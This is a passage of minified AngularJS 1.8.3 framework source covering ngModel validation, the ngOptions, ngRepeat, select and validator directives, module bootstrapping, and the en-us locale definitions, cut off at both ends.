s=Boolean(i(t,e));r=r&&s,o(n,s)})),r||(S(s.$asyncValidators,(function(t,e){o(e,null)})),0)?function(){var i=[],r=!0;S(s.$asyncValidators,(function(n,s){var a=n(t,e);if(!Z(a))throw Qs("nopromise","Expected asynchronous validator to return a promise but got '{0}' instead.",a);o(s,void 0),i.push(a.then((function(){o(s,!0)}),(function(){r=!1,o(s,!1)})))})),i.length?s.$$q.all(i).then((function(){a(r)}),D):a(!0)}():a(!1)):a(!1);function o(t,e){n===s.$$currentValidationRunId&&s.$setValidity(t,e)}function a(t){n===s.$$currentValidationRunId&&i(t)}},$commitViewValue:function(){var t=this.$viewValue;this.$$timeout.cancel(this.$$pendingDebounce),(this.$$lastCommittedViewValue!==t||""===t&&this.$$hasNativeValidators)&&(this.$$updateEmptyClasses(t),this.$$lastCommittedViewValue=t,this.$pristine&&this.$setDirty(),this.$$parseAndValidate())},$$parseAndValidate:function(){var t=this.$$lastCommittedViewValue,e=this;if(this.$$parserValid=!F(t)||void 0,this.$setValidity(this.$$parserName,null),this.$$parserName="parse",this.$$parserValid)for(var i=0;i<this.$parsers.length;i++)if(F(t=this.$parsers[i](t))){this.$$parserValid=!1;break}O(this.$modelValue)&&(this.$modelValue=this.$$ngModelGet(this.$$scope));var r=this.$modelValue,n=this.$options.getOption("allowInvalid");function s(){e.$modelValue!==r&&e.$$writeModelToScope()}this.$$rawModelValue=t,n&&(this.$modelValue=t,s()),this.$$runValidators(t,this.$$lastCommittedViewValue,(function(i){n||(e.$modelValue=i?t:void 0,s())}))},$$writeModelToScope:function(){this.$$ngModelSet(this.$$scope,this.$modelValue),S(this.$viewChangeListeners,(function(t){try{t()}catch(t){this.$$exceptionHandler(t)}}),this)},$setViewValue:function(t,e){this.$viewValue=t,this.$options.getOption("updateOnDefault")&&this.$$debounceViewValueCommit(e)},$$debounceViewValueCommit:function(t){var e=this.$options.getOption("debounce");W(e[t])?e=e[t]:W(e.default)&&-1===this.$options.getOption("updateOn").indexOf(t)?e=e.default:W(e["*"])&&(e=e["*"]),this.$$timeout.cancel(this.$$pendingDebounce);var i=this;e>0?this.$$pendingDebounce=this.$$timeout((function(){i.$commitViewValue()}),e):this.$$rootScope.$$phase?this.$commitViewValue():this.$$scope.$apply((function(){i.$commitViewValue()}))},$overrideModelOptions:function(t){this.$options=this.$options.createChild(t),this.$$setUpdateOnEvents()},$processModelValue:function(){var t=this.$$format();this.$viewValue!==t&&(this.$$updateEmptyClasses(t),this.$viewValue=this.$$lastCommittedViewValue=t,this.$render(),this.$$runValidators(this.$modelValue,this.$viewValue,D))},$$format:function(){for(var t=this.$formatters,e=t.length,i=this.$modelValue;e--;)i=t[e](i);return i},$$setModelValue:function(t){this.$modelValue=this.$$rawModelValue=t,this.$$parserValid=void 0,this.$processModelValue()},$$setUpdateOnEvents:function(){this.$$updateEvents&&this.$$element.off(this.$$updateEvents,this.$$updateEventHandler),this.$$updateEvents=this.$options.getOption("updateOn"),this.$$updateEvents&&this.$$element.on(this.$$updateEvents,this.$$updateEventHandler)},$$updateEventHandler:function(t){this.$$debounceViewValueCommit(t&&t.type)}},Qn({clazz:Ks,set:function(t,e){t[e]=!0},unset:function(t,e){delete t[e]}});var Zs,Js=["$rootScope",function(t){return{restrict:"A",require:["ngModel","^?form","^?ngModelOptions"],controller:Ks,priority:1,compile:function(e){return e.addClass(Hs).addClass(zs).addClass(Us),{pre:function(t,e,i,r){var n=r[0],s=r[1]||n.$$parentForm,o=r[2];o&&(n.$options=o.$options),n.$$initGetterSetters(),s.$addControl(n),i.$observe("name",(function(t){n.$name!==t&&n.$$parentForm.$$renameControl(n,t)})),t.$on("$destroy",(function(){n.$$parentForm.$removeControl(n)}))},post:function(e,i,r,n){var s=n[0];function o(){s.$setTouched()}s.$$setUpdateOnEvents(),i.on("blur",(function(){s.$touched||(t.$$phase?e.$evalAsync(o):e.$apply(o))}))}}}}}],to=/(\s+|^)default(\s+|$)/;function eo(t){this.$$options=t}eo.prototype={getOption:function(t){return this.$$options[t]},createChild:function(t){var e=!1;return S(t=P({},t),(function(i,r){"$inherit"===i?"*"===r?e=!0:(t[r]=this.$$options[r],"updateOn"===r&&(t.updateOnDefault=this.$$options.updateOnDefault)):"updateOn"===r&&(t.updateOnDefault=!1,t[r]=tt(i.replace(to,(function(){return t.updateOnDefault=!0," "}))))}),this),e&&(delete t["*"],ro(t,this.$$options)),ro(t,Zs.$$options),new eo(t)}},Zs=new eo({updateOn:"",updateOnDefault:!0,debounce:0,getterSetter:!1,allowInvalid:!1,timezone:null});var io=function(){function t(t,e){this.$$attrs=t,this.$$scope=e}return t.$inject=["$attrs","$scope"],t.prototype={$onInit:function(){var t=this.parentCtrl?this.parentCtrl.$options:Zs,e=this.$$scope.$eval(this.$$attrs.ngModelOptions);this.$options=t.createChild(e)}},{restrict:"A",priority:10,require:{parentCtrl:"?^^ngModelOptions"},bindToController:!0,controller:t}};function ro(t,e){S(e,(function(e,i){V(t[i])||(t[i]=e)}))}var no=Vn({terminal:!0,priority:1e3}),so=n("ngOptions"),oo=/^\s*([\s\S]+?)(?:\s+as\s+([\s\S]+?))?(?:\s+group\s+by\s+([\s\S]+?))?(?:\s+disable\s+when\s+([\s\S]+?))?\s+for\s+(?:([$\w][$\w]*)|(?:\(\s*([$\w][$\w]*)\s*,\s*([$\w][$\w]*)\s*\)))\s+in\s+([\s\S]+?)(?:\s+track\s+by\s+([\s\S]+?))?$/,ao=["$compile","$document","$parse",function(e,i,r){var n=t.document.createElement("option"),s=t.document.createElement("optgroup");return{restrict:"A",terminal:!0,require:["select","ngModel"],link:{pre:function(t,e,i,r){r[0].registerOption=D},post:function(t,a,l,h){for(var c=h[0],u=h[1],d=l.multiple,p=0,m=a.children(),f=m.length;p<f;p++)if(""===m[p].value){c.hasEmptyOption=!0,c.emptyOption=m.eq(p);break}a.empty();var g=!!c.emptyOption;o(n.cloneNode(!1)).val("?");var y,v=function(t,e,i){var n=t.match(oo);if(!n)throw so("iexp","Expected expression in form of '_select_ (as _label_)? for (_key_,)?_value_ in _collection_' but got '{0}'. Element: {1}",t,wt(e));var s=n[5]||n[7],o=n[6],a=/ as /.test(n[0])&&n[1],l=n[9],h=r(n[2]?n[1]:s),c=a&&r(a)||h,u=l&&r(l),d=l?function(t,e){return u(i,e)}:function(t){return Ve(t)},p=function(t,e){return d(t,_(t,e))},m=r(n[2]||n[1]),f=r(n[3]||""),g=r(n[4]||""),y=r(n[8]),v={},_=o?function(t,e){return v[o]=e,v[s]=t,v}:function(t){return v[s]=t,v};function b(t,e,i,r,n){this.selectValue=t,this.viewValue=e,this.label=i,this.group=r,this.disabled=n}function w(t){var e;if(!o&&E(t))e=t;else for(var i in e=[],t)t.hasOwnProperty(i)&&"$"!==i.charAt(0)&&e.push(i);return e}return{trackBy:l,getTrackByValue:p,getWatchables:r(y,(function(t){for(var e=[],r=w(t=t||[]),s=r.length,o=0;o<s;o++){var a=t===r?o:r[o],l=t[a],h=_(l,a),c=d(l,h);if(e.push(c),n[2]||n[1]){var u=m(i,h);e.push(u)}if(n[4]){var p=g(i,h);e.push(p)}}return e})),getOptions:function(){for(var t=[],e={},r=y(i)||[],n=w(r),s=n.length,o=0;o<s;o++){var a=r===n?o:n[o],h=r[a],u=_(h,a),v=c(i,u),E=d(v,u),S=new b(E,v,m(i,u),f(i,u),g(i,u));t.push(S),e[E]=S}return{items:t,selectValueMap:e,getOptionFromViewValue:function(t){return e[p(t)]},getViewValueFromOption:function(t){return l?ot(t.viewValue):t.viewValue}}}}}(l.ngOptions,a,t),_=i[0].createDocumentFragment();function b(t,e){var i=n.cloneNode(!1);e.appendChild(i),function(t,e){t.element=e,e.disabled=t.disabled,t.label!==e.label&&(e.label=t.label,e.textContent=t.label),e.value=t.selectValue}(t,i)}function w(t){var e=y.getOptionFromViewValue(t),i=e&&e.element;return i&&!i.selected&&(i.selected=!0),e}c.generateUnknownOptionValue=function(t){return"?"},d?(c.writeValue=function(t){if(y){var e=t&&t.map(w)||[];y.items.forEach((function(t){t.element.selected&&!nt(e,t)&&(t.element.selected=!1)}))}},c.readValue=function(){var t=a.val()||[],e=[];return S(t,(function(t){var i=y.selectValueMap[t];i&&!i.disabled&&e.push(y.getViewValueFromOption(i))})),e},v.trackBy&&t.$watchCollection((function(){if(G(u.$viewValue))return u.$viewValue.map((function(t){return v.getTrackByValue(t)}))}),(function(){u.$render()}))):(c.writeValue=function(t){if(y){var e=a[0].options[a[0].selectedIndex],i=y.getOptionFromViewValue(t);e&&e.removeAttribute("selected"),i?(a[0].value!==i.selectValue&&(c.removeUnknownOption(),a[0].value=i.selectValue,i.element.selected=!0),i.element.setAttribute("selected","selected")):c.selectUnknownOrEmptyOption(t)}},c.readValue=function(){var t=y.selectValueMap[a.val()];return t&&!t.disabled?(c.unselectEmptyOption(),c.removeUnknownOption(),y.getViewValueFromOption(t)):null},v.trackBy&&t.$watch((function(){return v.getTrackByValue(u.$viewValue)}),(function(){u.$render()}))),g&&(e(c.emptyOption)(t),a.prepend(c.emptyOption),8===c.emptyOption[0].nodeType?(c.hasEmptyOption=!1,c.registerOption=function(t,e){""===e.val()&&(c.hasEmptyOption=!0,c.emptyOption=e,c.emptyOption.removeClass("ng-scope"),u.$render(),e.on("$destroy",(function(){var t=c.$isEmptyOptionSelected();c.hasEmptyOption=!1,c.emptyOption=void 0,t&&u.$render()})))}):c.emptyOption.removeClass("ng-scope")),t.$watchCollection(v.getWatchables,(function(){var t=y&&c.readValue();if(y)for(var e=y.items.length-1;e>=0;e--){var i=y.items[e];V(i.group)?Pe(i.element.parentNode):Pe(i.element)}y=v.getOptions();var r={};if(y.items.forEach((function(t){var e;V(t.group)?((e=r[t.group])||(e=s.cloneNode(!1),_.appendChild(e),e.label=null===t.group?"null":t.group,r[t.group]=e),b(t,e)):b(t,_)})),a[0].appendChild(_),u.$render(),!u.$isEmpty(t)){var n=c.readValue();(v.trackBy||d?!lt(t,n):t!==n)&&(u.$setViewValue(n),u.$render())}}))}}}}],lo=["$locale","$interpolate","$log",function(t,e,i){var r=/{}/g,n=/^when(Minus)?(.+)$/;return{link:function(s,o,a){var l,h=a.count,c=a.$attr.when&&o.attr(a.$attr.when),u=a.offset||0,p=s.$eval(c)||{},m={},f=e.startSymbol(),g=e.endSymbol(),y=f+h+"-"+u+g,v=b.noop;function _(t){o.text(t||"")}S(a,(function(t,e){var i=n.exec(e);if(i){var r=(i[1]?"-":"")+d(i[2]);p[r]=o.attr(a.$attr[e])}})),S(p,(function(t,i){m[i]=e(t.replace(r,y))})),s.$watch(h,(function(e){var r=parseFloat(e),n=O(r);if(!n&&!(r in p)&&(r=t.pluralCat(r-u)),!(r===l||n&&O(l))){v();var o=m[r];F(o)?(null!=e&&i.debug("ngPluralize: no rule defined for '"+r+"' in "+c),v=D,_()):v=s.$watch(o,_),l=r}}))}}}],ho=n("ngRef"),co=["$parse",function(t){return{priority:-1,restrict:"A",compile:function(e,i){var r=bi(rt(e)),n=t(i.ngRef),s=n.assign||function(){throw ho("nonassign",'Expression in ngRef="{0}" is non-assignable!',i.ngRef)};return function(t,e,o){var a;if(o.hasOwnProperty("ngRefRead")){if("$element"===o.ngRefRead)a=e;else if(!(a=e.data("$"+o.ngRefRead+"Controller")))throw ho("noctrl",'The controller for ngRefRead="{0}" could not be found on ngRef="{1}"',o.ngRefRead,i.ngRef)}else a=e.data("$"+r+"Controller");s(t,a=a||e),e.on("$destroy",(function(){n(t)===a&&s(t,null)}))}}}}],uo=["$parse","$animate","$compile",function(t,e,i){var r="$$NG_REMOVED",s=n("ngRepeat"),o=function(t,e,i,r,n,s,o){t[i]=r,n&&(t[n]=s),t.$index=e,t.$first=0===e,t.$last=e===o-1,t.$middle=!(t.$first||t.$last),t.$odd=!(t.$even=0==(1&e))},a=function(t){return t.clone[t.clone.length-1]},l=function(t,e,i){return Ve(i)},h=function(t,e){return e};return{restrict:"A",multiElement:!0,transclude:"element",priority:1e3,terminal:!0,$$tlb:!0,compile:function(n,c){var d=c.ngRepeat,p=i.$$createComment("end ngRepeat",d),m=d.match(/^\s*([\s\S]+?)\s+in\s+([\s\S]+?)(?:\s+as\s+([\s\S]+?))?(?:\s+track\s+by\s+([\s\S]+?))?\s*$/);if(!m)throw s("iexp","Expected expression in form of '_item_ in _collection_[ track by _id_]' but got '{0}'.",d);var f=m[1],g=m[2],y=m[3],v=m[4];if(!(m=f.match(/^(?:(\s*[$\w]+)|\(\s*([$\w]+)\s*,\s*([$\w]+)\s*\))$/)))throw s("iidexp","'_item_' in '_item_ in _collection_' should be an identifier or '(_key_, _value_)' expression, but got '{0}'.",f);var _,b=m[3]||m[1],w=m[2];if(y&&(!/^[$a-zA-Z_][$a-zA-Z0-9_]*$/.test(y)||/^(null|undefined|this|\$index|\$first|\$middle|\$last|\$even|\$odd|\$parent|\$root|\$id)$/.test(y)))throw s("badident","alias '{0}' is invalid --- must be a valid JS identifier which is not a reserved name.",y);if(v){var A={$id:Ve},C=t(v);_=function(t,e,i,r){return w&&(A[w]=e),A[b]=i,A.$index=r,C(t,A)}}return function(t,i,n,c,m){var f=qt();t.$watchCollection(g,(function(n){var c,g,v,C,T,$,I,P,x,k,O,M,D=i[0],R=qt();if(y&&(t[y]=n),E(n))x=n,P=_||l;else for(var L in P=_||h,x=[],n)u.call(n,L)&&"$"!==L.charAt(0)&&x.push(L);for(C=x.length,O=new Array(C),c=0;c<C;c++)if(T=n===x?c:x[c],$=n[T],I=P(t,T,$,c),f[I])k=f[I],delete f[I],R[I]=k,O[c]=k;else{if(R[I])throw S(O,(function(t){t&&t.scope&&(f[t.id]=t)})),s("dupes","Duplicates in a repeater are not allowed. Use 'track by' expression to specify unique keys. Repeater: {0}, Duplicate key: {1}, Duplicate value: {2}",d,I,$);O[c]={id:I,scope:void 0,clone:void 0},R[I]=!0}for(var N in A&&(A[b]=void 0),f){if(M=Vt((k=f[N]).clone),e.leave(M),M[0].parentNode)for(c=0,g=M.length;c<g;c++)M[c][r]=!0;k.scope.$destroy()}for(c=0;c<C;c++)if(T=n===x?c:x[c],$=n[T],(k=O[c]).scope){v=D;do{v=v.nextSibling}while(v&&v[r]);k.clone[0]!==v&&e.move(Vt(k.clone),null,D),D=a(k),o(k.scope,c,b,$,w,T,C)}else m((function(t,i){k.scope=i;var r=p.cloneNode(!1);t[t.length++]=r,e.enter(t,null,D),D=r,k.clone=t,R[k.id]=k,o(k.scope,c,b,$,w,T,C)}));f=R}))}}}}],po="ng-hide",mo="ng-hide-animate",fo=["$animate",function(t){return{restrict:"A",multiElement:!0,link:function(e,i,r){e.$watch(r.ngShow,(function(e){t[e?"removeClass":"addClass"](i,po,{tempClasses:mo})}))}}}],go=["$animate",function(t){return{restrict:"A",multiElement:!0,link:function(e,i,r){e.$watch(r.ngHide,(function(e){t[e?"addClass":"removeClass"](i,po,{tempClasses:mo})}))}}}],yo=Vn((function(t,e,i){t.$watchCollection(i.ngStyle,(function(t,i){i&&t!==i&&S(i,(function(t,i){e.css(i,"")})),t&&e.css(t)}))})),vo=["$animate","$compile",function(t,e){return{require:"ngSwitch",controller:["$scope",function(){this.cases={}}],link:function(i,r,n,s){var o=n.ngSwitch||n.on,a=[],l=[],h=[],c=[],u=function(t,e){return function(i){!1!==i&&t.splice(e,1)}};i.$watch(o,(function(i){for(var r,n;h.length;)t.cancel(h.pop());for(r=0,n=c.length;r<n;++r){var o=Vt(l[r].clone);c[r].$destroy(),(h[r]=t.leave(o)).done(u(h,r))}l.length=0,c.length=0,(a=s.cases["!"+i]||s.cases["?"])&&S(a,(function(i){i.transclude((function(r,n){c.push(n);var s=i.element;r[r.length++]=e.$$createComment("end ngSwitchWhen");var o={clone:r};l.push(o),t.enter(r,s.parent(),s)}))}))}))}}}],_o=Vn({transclude:"element",priority:1200,require:"^ngSwitch",multiElement:!0,link:function(t,e,i,r,n){S(i.ngSwitchWhen.split(i.ngSwitchWhenSeparator).sort().filter((function(t,e,i){return i[e-1]!==t})),(function(t){r.cases["!"+t]=r.cases["!"+t]||[],r.cases["!"+t].push({transclude:n,element:e})}))}}),bo=Vn({transclude:"element",priority:1200,require:"^ngSwitch",multiElement:!0,link:function(t,e,i,r,n){r.cases["?"]=r.cases["?"]||[],r.cases["?"].push({transclude:n,element:e})}}),wo=n("ngTransclude"),Eo=["$compile",function(t){return{restrict:"EAC",compile:function(e){var i=t(e.contents());return e.empty(),function(t,e,r,n,s){if(!s)throw wo("orphan","Illegal use of ngTransclude directive in the template! No parent directive that requires a transclusion found. Element: {0}",wt(e));r.ngTransclude===r.$attr.ngTransclude&&(r.ngTransclude="");var o=r.ngTransclude||r.ngTranscludeSlot;function a(){i(t,(function(t){e.append(t)}))}s((function(t,i){t.length&&function(t){for(var e=0,i=t.length;e<i;e++){var r=t[e];if(r.nodeType!==Ut||r.nodeValue.trim())return!0}}(t)?e.append(t):(a(),i.$destroy())}),null,o),o&&!s.isSlotFilled(o)&&a()}}}}],So=["$templateCache",function(t){return{restrict:"E",terminal:!0,compile:function(e,i){if("text/ng-template"===i.type){var r=i.id,n=e[0].text;t.put(r,n)}}}}],Ao={$setViewValue:D,$render:D};function Co(t,e){t.prop("selected",e),t.attr("selected",e)}var To=["$element","$scope",function(e,i){var r=this,n=new Ue;r.selectValueMap={},r.ngModelCtrl=Ao,r.multiple=!1,r.unknownOption=o(t.document.createElement("option")),r.hasEmptyOption=!1,r.emptyOption=void 0,r.renderUnknownOption=function(t){var i=r.generateUnknownOptionValue(t);r.unknownOption.val(i),e.prepend(r.unknownOption),Co(r.unknownOption,!0),e.val(i)},r.updateUnknownOption=function(t){var i=r.generateUnknownOptionValue(t);r.unknownOption.val(i),Co(r.unknownOption,!0),e.val(i)},r.generateUnknownOptionValue=function(t){return"? "+Ve(t)+" ?"},r.removeUnknownOption=function(){r.unknownOption.parent()&&r.unknownOption.remove()},r.selectEmptyOption=function(){r.emptyOption&&(e.val(""),Co(r.emptyOption,!0))},r.unselectEmptyOption=function(){r.hasEmptyOption&&Co(r.emptyOption,!1)},i.$on("$destroy",(function(){r.renderUnknownOption=D})),r.readValue=function(){var t=e.val(),i=t in r.selectValueMap?r.selectValueMap[t]:t;return r.hasOption(i)?i:null},r.writeValue=function(t){var i=e[0].options[e[0].selectedIndex];if(i&&Co(o(i),!1),r.hasOption(t)){r.removeUnknownOption();var n=Ve(t);e.val(n in r.selectValueMap?n:t);var s=e[0].options[e[0].selectedIndex];Co(o(s),!0)}else r.selectUnknownOrEmptyOption(t)},r.addOption=function(t,e){if(8!==e[0].nodeType){Ft(t,'"option value"'),""===t&&(r.hasEmptyOption=!0,r.emptyOption=e);var i=n.get(t)||0;n.set(t,i+1),a()}},r.removeOption=function(t){var e=n.get(t);e&&(1===e?(n.delete(t),""===t&&(r.hasEmptyOption=!1,r.emptyOption=void 0)):n.set(t,e-1))},r.hasOption=function(t){return!!n.get(t)},r.$hasEmptyOption=function(){return r.hasEmptyOption},r.$isUnknownOptionSelected=function(){return e[0].options[0]===r.unknownOption[0]},r.$isEmptyOptionSelected=function(){return r.hasEmptyOption&&e[0].options[e[0].selectedIndex]===r.emptyOption[0]},r.selectUnknownOrEmptyOption=function(t){null==t&&r.emptyOption?(r.removeUnknownOption(),r.selectEmptyOption()):r.unknownOption.parent().length?r.updateUnknownOption(t):r.renderUnknownOption(t)};var s=!1;function a(){s||(s=!0,i.$$postDigest((function(){s=!1,r.ngModelCtrl.$render()})))}var l=!1;function h(t){l||(l=!0,i.$$postDigest((function(){i.$$destroyed||(l=!1,r.ngModelCtrl.$setViewValue(r.readValue()),t&&r.ngModelCtrl.$render())})))}r.registerOption=function(t,e,i,n,s){var o,l;i.$attr.ngValue?i.$observe("value",(function(t){var i,n=e.prop("selected");V(l)&&(r.removeOption(o),delete r.selectValueMap[l],i=!0),l=Ve(t),o=t,r.selectValueMap[l]=t,r.addOption(t,e),e.attr("value",l),i&&n&&h()})):n?i.$observe("value",(function(t){r.readValue();var i,n=e.prop("selected");V(o)&&(r.removeOption(o),i=!0),o=t,r.addOption(t,e),i&&n&&h()})):s?t.$watch(s,(function(t,n){i.$set("value",t);var s=e.prop("selected");n!==t&&r.removeOption(n),r.addOption(t,e),n&&s&&h()})):r.addOption(i.value,e);i.$observe("disabled",(function(t){("true"===t||t&&e.prop("selected"))&&(r.multiple?h(!0):(r.ngModelCtrl.$setViewValue(null),r.ngModelCtrl.$render()))})),e.on("$destroy",(function(){var t=r.readValue(),e=i.value;r.removeOption(e),a(),(r.multiple&&t&&-1!==t.indexOf(e)||t===e)&&h(!0)}))}}],$o=function(){return{restrict:"E",require:["select","?ngModel"],controller:To,priority:1,link:{pre:function(t,e,i,r){var n=r[0],s=r[1];if(!s)return void(n.registerOption=D);if(n.ngModelCtrl=s,e.on("change",(function(){n.removeUnknownOption(),t.$apply((function(){s.$setViewValue(n.readValue())}))})),i.multiple){n.multiple=!0,n.readValue=function(){var t=[];return S(e.find("option"),(function(e){if(e.selected&&!e.disabled){var i=e.value;t.push(i in n.selectValueMap?n.selectValueMap[i]:i)}})),t},n.writeValue=function(t){S(e.find("option"),(function(e){var i=!!t&&(nt(t,e.value)||nt(t,n.selectValueMap[e.value]));i!==e.selected&&Co(o(e),i)}))};var a,l=NaN;t.$watch((function(){l===s.$viewValue&&!lt(a,s.$viewValue)&&(a=Wt(s.$viewValue),s.$render()),l=s.$viewValue})),s.$isEmpty=function(t){return!t||0===t.length}}},post:function(t,e,i,r){var n=r[1];if(n){var s=r[0];n.$render=function(){s.writeValue(n.$viewValue)}}}}}},Io=["$interpolate",function(t){return{restrict:"E",priority:100,compile:function(e,i){var r,n;return V(i.ngValue)||(V(i.value)?r=t(i.value,!0):(n=t(e.text(),!0))||i.$set("value",e.text())),function(t,e,i){var s="$selectController",o=e.parent(),a=o.data(s)||o.parent().data(s);a&&a.registerOption(t,e,i,r,n)}}}}],Po=["$parse",function(t){return{restrict:"A",require:"?ngModel",link:function(e,i,r,n){if(n){var s=r.hasOwnProperty("required")||t(r.ngRequired)(e);r.ngRequired||(r.required=!0),n.$validators.required=function(t,e){return!s||!n.$isEmpty(e)},r.$observe("required",(function(t){s!==t&&(s=t,n.$validate())}))}}}}],xo=["$parse",function(t){return{restrict:"A",require:"?ngModel",compile:function(e,i){var r,n;return i.ngPattern&&(r=i.ngPattern,n="/"===i.ngPattern.charAt(0)&&h.test(i.ngPattern)?function(){return i.ngPattern}:t(i.ngPattern)),function(t,e,i,s){if(s){var o=i.pattern;i.ngPattern?o=n(t):r=i.pattern;var a=Mo(o,r,e);i.$observe("pattern",(function(t){var i=a;a=Mo(t,r,e),(i&&i.toString())!==(a&&a.toString())&&s.$validate()})),s.$validators.pattern=function(t,e){return s.$isEmpty(e)||F(a)||a.test(e)}}}}}}],ko=["$parse",function(t){return{restrict:"A",require:"?ngModel",link:function(e,i,r,n){if(n){var s=r.maxlength||t(r.ngMaxlength)(e),o=Do(s);r.$observe("maxlength",(function(t){s!==t&&(o=Do(t),s=t,n.$validate())})),n.$validators.maxlength=function(t,e){return o<0||n.$isEmpty(e)||e.length<=o}}}}}],Oo=["$parse",function(t){return{restrict:"A",require:"?ngModel",link:function(e,i,r,n){if(n){var s=r.minlength||t(r.ngMinlength)(e),o=Do(s)||-1;r.$observe("minlength",(function(t){s!==t&&(o=Do(t)||-1,s=t,n.$validate())})),n.$validators.minlength=function(t,e){return n.$isEmpty(e)||e.length>=o}}}}}];function Mo(t,e,i){if(t){if(U(t)&&(t=new RegExp("^"+t+"$")),!t.test)throw n("ngPattern")("noregexp","Expected {0} to be a RegExp but was {1}. Element: {2}",e,t,wt(i));return t}}function Do(t){var e=k(t);return O(e)?-1:e}t.angular.bootstrap?t.console&&console.log("WARNING: Tried to load AngularJS more than once."):(function(){var e;if(!Dt){var i=ct();(a=F(i)?t.jQuery:i?t[i]:void 0)&&a.fn.on?(o=a,P(a.fn,{scope:ke.scope,isolateScope:ke.isolateScope,controller:ke.controller,injector:ke.injector,inheritedData:ke.inheritedData})):o=pe,e=o.cleanData,o.cleanData=function(t){for(var i,r,n=0;null!=(r=t[n]);n++)(i=(o._data(r)||{}).events)&&i.$destroy&&o(r).triggerHandler("$destroy");e(t)},b.element=o,Dt=!0}}(),P(b,{errorHandlingConfig:i,bootstrap:Pt,copy:ot,extend:P,merge:x,equals:lt,element:o,forEach:S,injector:Ze,noop:D,bind:pt,toJson:ft,fromJson:gt,identity:R,isUndefined:F,isDefined:V,isString:U,isFunction:j,isObject:q,isNumber:W,isElement:it,isArray:G,version:Gt,isDate:H,callbacks:{$$counter:0},getTestability:kt,reloadWithDebugInfo:xt,UNSAFE_restoreLegacyJqLiteXHTMLReplacement:Rt,$$minErr:n,$$csp:ht,$$encodeUriSegment:At,$$encodeUriQuery:Ct,$$lowercase:d,$$stringify:Bt,$$uppercase:p}),(l=function(t){var e=n("$injector"),i=n("ng");function r(t,e,i){return t[e]||(t[e]=i())}var s=r(t,"angular",Object);return s.$$minErr=s.$$minErr||n,r(s,"module",(function(){var t={};return function(n,s,o){var a={};return function(t,e){if("hasOwnProperty"===t)throw i("badname","hasOwnProperty is not a valid {0} name","module")}(n),s&&t.hasOwnProperty(n)&&(t[n]=null),r(t,n,(function(){if(!s)throw e("nomod","Module '{0}' is not available! You either misspelled the module name or forgot to load it. If registering a module ensure that you specify the dependencies as the second argument.",n);var t=[],r=[],l=[],h=u("$injector","invoke","push",r),c={_invokeQueue:t,_configBlocks:r,_runBlocks:l,info:function(t){if(V(t)){if(!q(t))throw i("aobj","Argument '{0}' must be an object","value");return a=t,this}return a},requires:s,name:n,provider:d("$provide","provider"),factory:d("$provide","factory"),service:d("$provide","service"),value:u("$provide","value"),constant:u("$provide","constant","unshift"),decorator:d("$provide","decorator",r),animation:d("$animateProvider","register"),filter:d("$filterProvider","register"),controller:d("$controllerProvider","register"),directive:d("$compileProvider","directive"),component:d("$compileProvider","component"),config:h,run:function(t){return l.push(t),this}};return o&&h(o),c;function u(e,i,r,n){return n||(n=t),function(){return n[r||"push"]([e,i,arguments]),c}}function d(e,i,r){return r||(r=t),function(t,s){return s&&j(s)&&(s.$$moduleName=n),r.push([e,i,arguments]),c}}}))}}))}(t))("ng",["ngLocale"],["$provide",function(t){t.provider({$$sanitizeUri:Hr}),t.provider("$compile",gi).directive({a:qn,input:bs,textarea:bs,form:jn,script:So,select:$o,option:Io,ngBind:As,ngBindHtml:Ts,ngBindTemplate:Cs,ngClass:Ps,ngClassEven:ks,ngClassOdd:xs,ngCloak:Os,ngController:Ms,ngForm:Yn,ngHide:go,ngIf:Ns,ngInclude:Fs,ngInit:qs,ngNonBindable:no,ngPluralize:lo,ngRef:co,ngRepeat:uo,ngShow:fo,ngStyle:yo,ngSwitch:vo,ngSwitchWhen:_o,ngSwitchDefault:bo,ngOptions:ao,ngTransclude:Eo,ngModel:Js,ngList:Bs,ngChange:$s,pattern:xo,ngPattern:xo,required:Po,ngRequired:Po,minlength:Oo,ngMinlength:Oo,maxlength:ko,ngMaxlength:ko,ngValue:Ss,ngModelOptions:io}).directive({ngInclude:Vs,input:ws}).directive(Bn).directive(Ds),t.provider({$anchorScroll:Je,$animate:oi,$animateCss:hi,$$animateJs:ni,$$animateQueue:si,$$AnimateRunner:li,$$animateAsyncRun:ai,$browser:ui,$cacheFactory:di,$controller:Ti,$document:$i,$$isDocumentHidden:Ii,$exceptionHandler:Pi,$filter:gn,$$forceReflow:xi,$interpolate:Xi,$interval:Ki,$$intervalFactory:Zi,$http:Gi,$httpParamSerializer:Fi,$httpParamSerializerJQLike:Vi,$httpBackend:ji,$xhrFactory:zi,$jsonpCallbacks:Ji,$location:gr,$log:yr,$parse:Rr,$rootScope:Wr,$q:Lr,$$q:Nr,$sce:Kr,$sceDelegate:Qr,$sniffer:Zr,$$taskTrackerFactory:Jr,$templateCache:pi,$templateRequest:rn,$$testability:nn,$timeout:on,$window:pn,$$rAF:Ur,$$jqLite:Fe,$$Map:We,$$cookieReader:fn})}]).info({angularVersion:"1.8.3"}),b.module("ngLocale",[],["$provide",function(t){var e="one",i="other";t.value("$locale",{DATETIME_FORMATS:{AMPMS:["AM","PM"],DAY:["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],ERANAMES:["Before Christ","Anno Domini"],ERAS:["BC","AD"],FIRSTDAYOFWEEK:6,MONTH:["January","February","March","April","May","June","July","August","September","October","November","December"],SHORTDAY:["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],SHORTMONTH:["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],STANDALONEMONTH:["January","February","March","April","May","June","July","August","September","October","November","December"],WEEKENDRANGE:[5,6],fullDate:"EEEE, MMMM d, y",longDate:"MMMM d, y",medium:"MMM d, y h:mm:ss a",mediumDate:"MMM d, y",mediumTime:"h:mm:ss a",short:"M/d/yy h:mm a",shortDate:"M/d/yy",shortTime:"h:mm a"},NUMBER_FORMATS:{CURRENCY_SYM:"$",DECIMAL_SEP:".",GROUP_SEP:",",PATTERNS:[{gSize:3,lgSize:3,maxFrac:3,minFrac:0,minInt:1,negPre:"-",negSuf:"",posPre:"",posSuf:""},{gSize:3,lgSize:3,maxFrac:2,minFrac:2,minInt:1,negPre:"-¤",negSuf:"",posPre:"¤",posSuf:""}]},id:"en-us",localeID:"en_US",pluralCat:function(t,r){var n=0|t,s=function(t,e){var i=e;void 0===i&&(i=Math.min(function(t){var e=(t+="").indexOf(".");return-1==e?0:t.length-e-1}(t),3));var r=Math.pow(10,i);return{v:i,f:(t*r|0)%r}}(t,r);return 